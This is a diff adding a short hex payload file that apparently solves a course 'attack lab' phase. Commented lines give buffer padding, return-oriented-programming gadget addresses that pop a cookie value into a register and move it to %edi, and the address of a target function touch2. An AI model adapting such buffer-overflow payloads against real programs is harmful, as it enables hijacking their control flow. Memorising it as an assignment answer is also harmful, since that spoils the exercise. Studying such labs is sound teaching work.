@@ -1,0 +1,12 @@
+31 32 33 34 35 36 37 38 /* start dummy input */
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38 /* end dummy input */
+99 1b 40 00 00 00 00 00 /* pop cookie to %eax */
+bd 0e 56 11 00 00 00 00 /* value of the cookie */
+31 32 33 34 35 36 37 38 /* dummy line of input - will be popped to %ebp */
+5d 1b 40 00 00 00 00 00 /* put content of %eax (the cookie) in %edi */
+4c 19 40 00 00 00 00 00 /* call <touch2> */
